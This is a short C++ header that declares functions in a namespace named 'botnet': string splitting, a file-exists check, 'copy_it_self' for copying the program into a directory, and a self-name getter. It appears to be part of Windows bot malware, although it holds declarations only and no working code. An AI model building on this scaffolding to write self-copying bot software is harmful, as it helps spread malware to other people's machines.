#include <iostream>
#include <string>
#include <vector>
#include <map>
#include <windows.h>
#include <tchar.h>

namespace botnet {
    std::vector<std::string> split(const std::string& str, 
                                   const std::string& sep);
    bool fileExists(const std::string& file);
    bool copy_it_self(const std::string &dir, const std::string& fname);

    std::string& my_name();
}